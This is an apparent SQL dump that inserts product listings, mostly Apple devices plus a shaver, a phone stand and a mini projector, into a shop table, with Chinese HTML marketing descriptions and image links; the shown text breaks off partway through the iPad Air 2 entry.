INSERT INTO `movesay_shop` VALUES ('1', 'Apple iPhone 6s (A1700) 64G 玫瑰金色 移动联通电信4G手机', '', '\\Upload\\shop\\563311c4f0cc5.png', 'qita', '6000.00000000', '998.00000000', '2.00000000', '<p style=\"text-align:center;\">\r\n	<img src=\"/Upload/563311bc2ce1c.jpg\" alt=\"\" /> \r\n</p>', '', '0', '1446313478', '0', '0', '0.00');
INSERT INTO `movesay_shop` VALUES ('2', 'Apple iPhone 6s (A1700) 16G 金色 移动联通电信4G手机', '', '\\Upload\\shop\\5633138fa8737.png', 'qita', '5200.00000000', '1000.00000000', '287.00000000', '<div style=\"text-align:center;\">\r\n	<span style=\"font-size:12px;line-height:1.5;\"></span><img src=\"/Upload/563313883ed70.jpg\" alt=\"\" /><img src=\"/Upload/5633138dc849d.jpg\" alt=\"\" />\r\n</div>', '', '0', '1446302732', '0', '0', '0.00');
INSERT INTO `movesay_shop` VALUES ('3', '飞科(FLYCO)FS372全身水洗电动剃须刀刮胡须刀', '', '\\Upload\\shop\\5634beeca12bc.png', 'qita', '79.00000000', '1000.00000000', '358.00000000', '<div style=\"text-align:center;\">\r\n	<span style=\"font-size:12px;line-height:1.5;\"></span><img src=\"/Upload/5634bfd56ab25.jpg\" alt=\"\" /><img src=\"/Upload/5634bfdd757ce.gif\" alt=\"\" /><img src=\"/Upload/5634bfe36db03.jpg\" alt=\"\" /><img src=\"/Upload/5634bfea647e3.jpg\" alt=\"\" /><img src=\"/Upload/5634bff0d59a9.jpg\" alt=\"\" /><img src=\"/Upload/5634bff7e32ad.jpg\" alt=\"\" /><img src=\"/Upload/5634bffde8fe8.jpg\" alt=\"\" />\r\n</div>', '', '0', '1446302749', '0', '0', '0.00');
INSERT INTO `movesay_shop` VALUES ('4', 'Apple Watch Sport MJ3N2CH/A（42毫米银色铝金属表壳搭配白色运动型表带）', '', '\\Upload\\shop\\5634c0b4c7956.png', 'qita', '2900.00000000', '885.00000000', '115.00000000', '<div style=\"text-align:center;\">\r\n	<span style=\"font-size:12px;line-height:1.5;\"></span><img src=\"/Upload/5634c146430b7.jpg\" alt=\"\" />\r\n</div>', '', '0', '1446302815', '0', '0', '0.00');
INSERT INTO `movesay_shop` VALUES ('5', '苹果（Apple）MacBook Pro MF839CH/A 13.3英寸宽屏笔记本电脑', '', '\\Upload\\shop\\5634c478f264c.png', 'qita', '8800.00000000', '100.00000000', '20.00000000', '<div style=\"color:#666666;background-color:#FFFFFF;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:55px;text-align:center;\">\r\n		MacBook Pro\r\n	</p>\r\n	<p style=\"font-size:24px;text-align:center;\">\r\n		配备Retina 显示屏\r\n	</p>\r\n	<p style=\"font-size:26px;text-align:center;\">\r\n		每一像素颗粒，尽显澎湃动力。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150316172658167.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;background-color:#FFFFFF;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		绚丽夺目的 Retina 显示屏\r\n	</p>\r\n	<p style=\"font-size:26px;text-align:center;\">\r\n		领先于时代好几百万像素\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		15 英寸机型拥有超过 500 万像素，13 英寸机型拥有超过 400 万像素。因此，无论你是在润饰照片还是剪辑 HD高清家庭影片，都能获得令人震撼的清晰度。文字也锐利清晰，让浏览网页和修改文档这些日常之事都变得比以往更加赏心悦目。这样的显示屏方能配得上这款极为先进的笔记本电脑。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150316172704893.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;background-color:#FFFFFF;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		Force Touch 触控版\r\n	</p>\r\n	<p style=\"font-size:26px;text-align:center;\">\r\n		让相应式深入全新境界\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		13 英寸 MacBook Pro 带来你与 Mac 互动的全新方式。设计精巧的 Force Touch 触控板，让你无论点按表面的哪个位置，都能得到灵敏且效果一致的点击响应。在触控板下方，力度感应器能检测你的点按力度，为触控操作添加全新维度。你可以通过用力长按来启用一系列新功能，例如只需在触控板上增加按压力度，即可快速查看词语定义或预览文件。你还可以体验触觉反馈，触控板会发出触觉振动，因此你在屏幕上看到的一切，还能感觉到。所有这些先进功能，全可与深受 Mac 用户喜爱的 Multi-Touch 手势配合使用。轻轻松松间，你与 Mac 之间的沟通，迈入全新境界。仅限13英寸机型。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150316172711911.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;background-color:#FFFFFF;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		众多全新高性能技术\r\n	</p>\r\n	<p style=\"font-size:26px;text-align:center;\">\r\n		技术齐心协力，更快成就一切\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		拥有动力强劲的双核与四核 Intel 处理器、先进的图形处理器、基于 PCIe 的高速闪存、疾速内存和 Thunderbolt 2 端口，配备 Retina 显示屏的 MacBook Pro 带来全方位卓越性能，满足你对笔记本电脑的所有期待。无论你是浏览网站或构建网站，还是播放流媒体视频或剪辑视频，MacBook Pro 都能以超乎想象的动力和速度飞速处理极为复杂 (和不太复杂) 的任务。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150316172717994.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;background-color:#FFFFFF;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		纤薄、轻巧、强劲\r\n	</p>\r\n	<p style=\"font-size:26px;text-align:center;\">\r\n		毫厘之间，蕴藏无限创新\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		MacBook Pro 的设计精髓，就是在有限空间里满载强劲性能。因为我们相信，追求高性能不应该牺牲便携性。尽管全新 13 英寸 MacBook Pro 如此轻巧，却仍能提供长达 10 小时的电池使用时间，比前一代产品更长一个小时*。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150316172723576.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;background-color:#FFFFFF;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		配备一系列强大APP\r\n	</p>\r\n	<p style=\"font-size:26px;text-align:center;\">\r\n		工作事事顺手，娱乐即可上手\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		每台全新 Mac 均配备 iPhoto、iMovie、GarageBand、Pages、Numbers 和 Keynote。从开启它的那一刻起，你就可以运用照片、视频、音乐、文档、电子表格和演示文稿来尽情挥洒创意。为了配合 OS X Yosemite 的精美设计，这些 app 均已进行升级。同时，你还享有多款精彩 app，用以收发电子邮件、畅游网络、发送文本信息、进行 FaceTime 视频通话，甚至还有一款 app，可以帮你查找新的 app。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150316172730531.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		OS X Yosemite\r\n	</p>\r\n	<p style=\"font-size:26px;text-align:center;\">\r\n		超前的电脑操作系统\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		OS X Yosemite 使用简易、优雅美观，更经过精心打造，使得 Mac 硬件的功能得到充分发挥，堪称超前的电脑操作系统。它配备一系列出众的 app，满足你的日常所需。此外，它还让你的 Mac 和 iOS 设备能以绝佳方式默契合作。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		Retina 显示屏\r\n	</p>\r\n	<p style=\"font-size:26px;text-align:center;\">\r\n		好几百万像素的好风景\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		<br />\r\n	</p>\r\n	<p style=\"font-size:15px;font-weight:bold;\">\r\n		13 英寸 MacBook Pro\r\n	</p>\r\n	<p style=\"font-size:15px;font-weight:bold;\">\r\n		13 英寸配备 Retina 显示屏的 MacBook Pro\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;margin:0px auto;font-family:微软雅黑;padding:0px;\">\r\n	<p style=\"font-size:14px;\">\r\n		当你将如此多的像素纳入一个显示屏中：13 英寸机型达到 400 多万像素，15 英寸机型达到 500 多万像素，效果绝对绚丽夺目。其超高像素密度已超过人眼所能分辨的范围，使图像的逼真度提升至全新境界。13 英寸 MacBook Pro 具备惊人的 2560 x 1600 像素分辨率，而 15 英寸 MacBook Pro 拥有同样可观的 2880 x 1800 像素分辨率，可让你的高分辨率图像以像素级的精度纤毫毕现。而且文字如此锐利，让你竟有种在纸面上阅读电子邮件、网页和文档的感觉。\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		Retina 显示屏在保持非凡色彩和画质的同时，减少了眩光的出现。它的高对比度令黑色更浓郁，白色更明亮，其他一切色彩也都显得更丰富，更鲜艳。IPS 技术让你能够以 178 度的宽广视角观赏屏幕上的一切，因此你几乎可以从任何角度感受到它的与众不同。你也一定会为自己所看到的一切而着迷。\r\n	</p>\r\n	<p style=\"font-size:12px;\">\r\n		13 英寸配备 Retina 显示屏的 MacBook Pro 比 HDTV 多了近 200 万像素，15 英寸机型则多了 300 万像素。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		先进的 Intel 移动处理器\r\n	</p>\r\n	<p style=\"font-size:26px;text-align:center;\">\r\n		双核、四核，强大不可小视\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		13 英寸配备 Retina 显示屏的 MacBook Pro，搭载第五代双核 Intel Core i5 或 Intel Core i7 处理器，可随时随地轻松满足那些对性能有较高要求的 app。这意味着，无论你带着相机去哪里，你的整个数字照片工作室将如影随行。每款机型均采用超线程技术，通过让每个内核同时处理多个任务来增强性能。快达 3.1GHz 的处理速度、高达 4MB 的共享三级缓存和高达3.4GHz 的 Turbo Boost 睿频加速技术，使这些处理器可随时应对任何任务。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		高性能图形处理器\r\n	</p>\r\n	<p style=\"font-size:26px;text-align:center;\">\r\n		荧屏表现，淋漓尽致\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		13 英寸配备 Retina 显示屏的 MacBook Pro 搭载 Intel Iris Graphics 6100 图形处理器，是执行日常任务和各种图形密集型创意 app 的理想选择。你可以轻松翻阅大型照片库，畅玩那些充满精彩细节的游戏，还能连接一或两台外部显示器，这是对 13 英寸 MacBook Pro 小巧身材和超凡性能的又一次精彩诠释。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		长效电池\r\n	</p>\r\n	<p style=\"font-size:26px;text-align:center;\">\r\n		续航长达 10 小时\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		13 英寸 MacBook Pro 充电一次可运行长达 10 小时，比上一代多了一小时。而 15 英寸机型可运行长达 8小时。对任何笔记本电脑而言，这样的电池使用时间都令人赞叹。但对于配备了超高分辨率显示屏、先进处理器和图形处理器，以及超薄设计的高性能笔记本电脑而言，这绝对是超乎想象的。内置电池能为你提供多达 1000 次的完全充电和放电循环。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		更快的全闪存\r\n	</p>\r\n	<p style=\"font-size:26px;text-align:center;\">\r\n		闪存之名，并非徒有虚名\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		基于 PCle 的闪存拥有惊人的读写速度，无论你做什么，都能感受到其中的差别：启动非常快速，app 开启迅捷，甚至连桌面操作也十分流畅，响应十分迅速。13 英寸机型的闪存比前一代产品快达 2 倍，令你能在瞬间导入海量图片库。而在 15 英寸机型上，闪存与四核处理器和高性能图形处理器相结合，令 Final Cut Pro X 中要求极高的剪辑任务也能快速完成。由于这些 MacBook Pro 机型均配备了高达 1TB 的闪存，因此你可以随身携带所有的重要文件3。此外，闪存没有任何活动部件，所以超级耐用且十分安静。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;background-color:#FFFFFF;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		Mac 之妙\r\n	</p>\r\n	<p style=\"font-size:26px;text-align:center;\">\r\n		妙在它能帮你做到的一切\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		每台 Mac 都配备了众多激发创意和提升效率的 app。同时，还拥有一系列出色的 app 来处理各种日常事务，包括浏览网页、发送邮件和信息，以及整理你的日历。甚至还有一款 app，可以帮你查找新的 app。所以，你的 Mac 不仅功能齐备，而且全副武装。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150316173058291.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;background-color:#FFFFFF;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:18px;\">\r\n		<br />\r\n	</p>\r\n</div>', '', '0', '1446302797', '0', '1', '0.00');
INSERT INTO `movesay_shop` VALUES ('6', 'E能之芯 铝合金纳米微吸手机平板通用底座支架', '', '\\Upload\\shop\\5634c53ab0835.png', 'qita', '75.00000000', '100.00000000', '20.00000000', '<p style=\"color:#666666;font-family:微软雅黑, Arial;text-align:center;background-color:#FFFFFF;\">\r\n	<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150723181046506.jpg\" />\r\n</p>\r\n<p style=\"color:#666666;font-family:微软雅黑, Arial;text-align:center;background-color:#FFFFFF;\">\r\n	<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150723181051106.jpg\" />\r\n</p>\r\n<p style=\"color:#666666;font-family:微软雅黑, Arial;text-align:center;background-color:#FFFFFF;\">\r\n	<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150723181058295.jpg\" />\r\n</p>\r\n<p style=\"color:#666666;font-family:微软雅黑, Arial;text-align:center;background-color:#FFFFFF;\">\r\n	<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150723181105146.jpg\" />\r\n</p>\r\n<p style=\"color:#666666;font-family:微软雅黑, Arial;text-align:center;background-color:#FFFFFF;\">\r\n	<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150723181111449.jpg\" />\r\n</p>\r\n<p style=\"color:#666666;font-family:微软雅黑, Arial;text-align:center;background-color:#FFFFFF;\">\r\n	<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150723181117691.jpg\" />\r\n</p>\r\n<p style=\"color:#666666;font-family:微软雅黑, Arial;text-align:center;background-color:#FFFFFF;\">\r\n	<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150723181125633.jpg\" />\r\n</p>\r\n<p style=\"color:#666666;font-family:微软雅黑, Arial;text-align:center;background-color:#FFFFFF;\">\r\n	<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150723181133337.jpg\" />\r\n</p>\r\n<p style=\"color:#666666;font-family:微软雅黑, Arial;text-align:center;background-color:#FFFFFF;\">\r\n	<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150723181140847.jpg\" />\r\n</p>\r\n<p style=\"color:#666666;font-family:微软雅黑, Arial;text-align:center;background-color:#FFFFFF;\">\r\n	<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150723181147149.jpg\" />\r\n</p>\r\n<p style=\"color:#666666;font-family:微软雅黑, Arial;text-align:center;background-color:#FFFFFF;\">\r\n	<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150723181155338.jpg\" />\r\n</p>\r\n<p style=\"color:#666666;font-family:微软雅黑, Arial;text-align:center;background-color:#FFFFFF;\">\r\n	<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150723181203553.jpg\" />\r\n</p>\r\n<p style=\"color:#666666;font-family:微软雅黑, Arial;text-align:center;background-color:#FFFFFF;\">\r\n	<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150723181209887.jpg\" />\r\n</p>', '', '0', '1446299008', '0', '1', '0.00');
INSERT INTO `movesay_shop` VALUES ('7', '捷视（JS）A1 商务家用手持高清无线微型投影仪', '', '\\Upload\\shop\\5634c6655eb61.png', 'qita', '1900.00000000', '100.00000000', '20.00000000', '<div style=\"background-color:#FFFFFF;margin:10px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:35px;text-align:center;\">\r\n		捷视 A1无线微型投影仪\r\n	</p>\r\n	<p style=\"font-size:20px;text-align:center;\">\r\n		全球首款基于DLP技术，LED光源技术微型投影仪\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;text-indent:28px;\">\r\n		A1是全球首款基于DLP技术，0.3英寸DMD芯片全功能自解码（最高支持1080P分辨率视频）LED光源技术微型投影仪，内置无线通讯互联技术模块，同各种数码产品相连接，无需外接繁琐的数据线及电源线，不受空间，地域环境限制。LED微型投影仪，又称口袋式投影机、便携式投影机、是把传统庞大的投影机精巧化、便携化、微小化，娱乐化、实用化、使投影更加贴近生活和娱乐。由于采用国际一流（OSRAM，欧司朗半导体公司）LED光源技术，鉴于LED的超强使用寿命，该机平均使用寿命超过3万小时。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150416165527528.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"background-color:#FFFFFF;margin:10px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:35px;text-align:center;\">\r\n		小投影，大画面\r\n	</p>\r\n	<p style=\"font-size:20px;text-align:center;\">\r\n		工作、娱乐一机到位，随时随地与他人分享\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;text-indent:28px;\">\r\n		业界首款内置无线高速Wi-Fi模块及1080P高清解码芯片，可解读及传输九城以上视频片源，让你的网络视频无处不在，小投影，大画面，随时随地同他人分享视频、图片等资源，采用直读TF卡或者机器内存的OFFICE文档，处理文档更加方便快捷。A1无线微型投影仪适用于移动商务（尤其是：IT、咨询、顾问、金融、保险、直销等行业）、产品展示，播放OFFICE文档，数码产品影视分享，电玩游戏、小型会议及教学、户外娱乐活动、PARTY等，儿童教育及娱乐。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150416165536856.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"background-color:#FFFFFF;margin:10px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:35px;text-align:center;\">\r\n		内置无线通讯模块\r\n	</p>\r\n	<p style=\"font-size:20px;text-align:center;\">\r\n		手机遥控器，有线无线连接电脑，一步到位\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;text-indent:28px;\">\r\n		支持手机遥控器，手机可当做是遥控器来操控投影。连接电脑，可有线、无线连接电脑。该产品不仅可以通过只读取TF卡或机器内存功能，还可以通过内置无线通讯模块同智能手机无线连接，将手机屏幕显示内容无线传输到投影仪，并投射出来，支持安卓同苹果系统手机，同时支持该系统的 iPad、PC等，并能够有线无线连接笔记本或台式电脑并同时镜像屏幕内容。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150416165543271.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"background-color:#FFFFFF;margin:10px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:35px;text-align:center;\">\r\n		全球首款人性化的操作界面\r\n	</p>\r\n	<p style=\"font-size:20px;text-align:center;\">\r\n		易读、易懂、易操作\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;text-indent:28px;\">\r\n		全球首款人性化的操作界面，易读易懂，与同类产品相比，首次接触该产品的使用者，能在更短的时间内掌握大部分功能操作，让使用者能以愉快的心情去欣赏所喜爱的视频画面中。手持投影产品中，这款亮度适中，画面对比度1000：1，854x480高分辨率，色彩艳丽通透，还原性好，图像清晰、锐利，播放文档等文字清晰高，细节良好。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150416165550219.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"background-color:#FFFFFF;margin:0px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150416165559914.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;margin:10px auto;font-family:微软雅黑;padding:0px;\">\r\n	<p style=\"font-size:20px;\">\r\n		与其他同类产品相比，具有如下特点及优点:\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		● 业界同功能的整机中体积最小，重量最轻，携带性更好。<br />\r\n● 能通过有线无线连接windows系统，苹果系统产品，安卓系统产品等。<br />\r\n● 同距离投影时，画面面积要比同类产品大10英寸左右，画面直观看起来更加舒服，流畅。<br />\r\n● 机器内置无线通讯模块，数据处理与接收稳定，不受外界环境因素，搬动，震动等造成无线通讯信号中断或者影响播放流畅度，整机批量供货时良品高。<br />\r\n● 由于使用的是聚合物锂电池，安全性要高于市场上同类机型所用电池，续航能力及使用寿命高于普通锂电池。<br />\r\n● 优化散热设计风道，噪音低，整机开孔率少，吸附灰尘几率小，外观工艺处理更好，整机故障返修率低。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150416171738581.jpg\" />\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150416171753458.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150416165629394.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"background-color:#FFFFFF;margin:0px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150416165636135.jpg\" />\r\n	</p>\r\n	<p style=\"font-size:15px;font-weight:bold;\">\r\n		1、是否所有的手机都能与该微型投影仪无线连接？\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		答：目前支持的手机操作系统为安卓4.0版本以上，苹果系统版本为5.1（含该版本）才能使用，暂不支持windowsphone系列操作系统手机。\r\n	</p>\r\n	<p style=\"font-size:15px;font-weight:bold;\">\r\n		2、画面最大可以投影多大面积？\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		答：40英寸左右/1米，在较暗的房间里投射面积更大，最大80英寸，视 环境及投射内容来决定投影面积大小。\r\n	</p>\r\n	<p style=\"font-size:15px;font-weight:bold;\">\r\n		3、机器内部有自带内存吗？\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		答：机器除去可以外接TF卡（最高支持32G）外，内部自带4G内存，可以存储用户想要存储的内容。\r\n	</p>\r\n	<p style=\"font-size:15px;font-weight:bold;\">\r\n		4、可以遥控吗，为何没有遥控器？\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		答：该产品的设计理念为手持产品，机器表面按键基本能满足遥控的功能，不是桌面大型投影，按键功能操作起来更方便，不存在遥控死角，携带方便 。其次我们设计的同智能手机可以无线通讯的，利用手机同无线Wi-fi连接，可以实现网上内容海量传输，同时手机也可以安装EZCONTROL这个APP软件，通过这个软件来操作投影整个功能。大部分遥控功能手机可以取代，通过手机触控操作更加方便。\r\n	</p>\r\n	<p style=\"font-size:15px;font-weight:bold;\">\r\n		5、可以外接音箱吗？\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		答：可以外接多媒体或者其他有线有源音箱。\r\n	</p>\r\n	<p style=\"font-size:15px;font-weight:bold;\">\r\n		6、可以用移动电源对机器供电吗？选用怎样的移动电源供电？一般的移动电源可以用多长时间？\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		答：可以使用，根据我们外接的供充电适配器供电参数，选用的移动电源是5V/2A的，使用Micro usb的插头即可，使用时间要看投影播放的内容及移动电源的电池容量。\r\n	</p>\r\n	<p style=\"font-size:15px;font-weight:bold;\">\r\n		7、整机的使用寿命能用多久，售后怎样保证？\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		答：整机使用的全球一流的LED光源技术，上面栏目已经提到，正常使用寿命是3万小时以上，按照每天使用8小时计算，8小时X365=2920小时，整机最低可以使用8年以上，微型投影结构设计难度在于散热及风道设计合理，本机不同于市场上某些产品，开孔率高，风道设计分散，容易吸进灰尘，造成机器电路板损坏及散热风扇停转；其次市场上某些机器由于散热设计不合理，发热量高，机器在工作的时候，明显感觉到机身发热，甚至超过使用者的耐热温度，给使用者不好的体验感。本机整机噪音亦低于同类产品，不会在你使用的时候听到恼人的噪音；本机已通过国家3C认证，安全性及品质有保证，不用担心使用安全及售后服务。\r\n	</p>\r\n	<p style=\"font-size:15px;font-weight:bold;\">\r\n		8、亮度会衰减吗？\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		答：使用3到5年以后，可能亮度衰减总体15%，电子产品本身是消耗品，长期使用后，亮度衰减是属于正常情况，但是整机不会停止工作，在投射画面亮度上略显偏低。\r\n	</p>\r\n	<p style=\"font-size:15px;font-weight:bold;\">\r\n		9、这个投影仪为什么没有幕布？直接投在白色墙上效果会受影响吗？\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		答: 这个是便携式投影仪，设计思想是随时随地投影，所以没有必要配投影幕，投射到墙壁上是可以的，白色无污点的墙壁即可，投影效果没有影响。\r\n	</p>\r\n	<p style=\"font-size:15px;font-weight:bold;\">\r\n		10、为什么机器在使用中，感觉机身有些热量？\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		答：投影机内部光源在工作时会产生热量，通过内部的风路将热量散出，热量在行进过程中，部分会通过机器外壳，所以会感觉到机器外壳有些热量，属于正常现象，不会影响使用。\r\n	</p>\r\n	<p style=\"font-size:15px;font-weight:bold;\">\r\n		11、使用注意重点事项？\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		答：严禁进、出空气口被异物阻档，或者机身被其他物体覆盖，导致机器工作时产生的热量将不能及时有效排出，造成机身发热明显，损坏整机；严禁在风沙环境中或者强酸强碱环境中使用；严禁机器进水等其他液体，以免损坏整机。\r\n	</p>\r\n</div>', '', '0', '1446299237', '0', '1', '0.00');
INSERT INTO `movesay_shop` VALUES ('8', '苹果（Apple）iPad Air 2 9.7英寸平板电脑 16G WiFi版', '', '\\Upload\\shop\\5634c7010367b.png', 'qita', '3400.00000000', '100.00000000', '20.00000000', '<p>\r\n	<br />\r\n</p>\r\n<p style=\"font-size:45px;text-align:center;\">\r\n	<br />\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p style=\"font-size:45px;text-align:center;\">\r\n	iPad Air 2\r\n</p>\r\n<p style=\"font-size:35px;text-align:center;\">\r\n	轻轻地，改变一切。\r\n</p>\r\n<p style=\"text-align:center;\">\r\n	<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20141024154812638.jpg\" /> \r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<p style=\"font-size:30px;text-align:center;\">\r\n	多才多能，让你不想放手；<br />\r\n<br />\r\n又轻又薄，让你不觉在手。\r\n</p>\r\n<p style=\"font-size:14px;text-align:center;\">\r\n	对于 iPad，我们一直都有一个看似自相矛盾的目标：要创造一部功能极为强大，但又轻盈纤薄到你不觉在手的设备；一部让你能全力挥洒，但却毫不费力的设备。 iPad Air 2 不仅实现了这一切，甚至还超出了我们的预期。\r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<div style=\"color:#333333;margin:0px auto;font-family:微软雅黑;padding:0px;\">\r\n	<p style=\"font-size:35px;\">\r\n		<br />\r\n	</p>\r\n</div>\r\n<div style=\"color:#333333;background-color:#FFFFFF;margin:0px auto;font-family:微软雅黑;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20141024154927978.jpg\" /> \r\n	</p>\r\n</div>\r\n<p>\r\n	<br />\r\n</p>\r\n<p style=\"font-size:35px;text-align:center;\">\r\n	众多 App，为 iPad 量身打造，<br />\r\n<br />\r\n也为成就你想做的一切。\r\n</p>\r\n<p style=\"font-size:14px;text-align:center;\">\r\n	iPad Air 2 内置多款强大 app 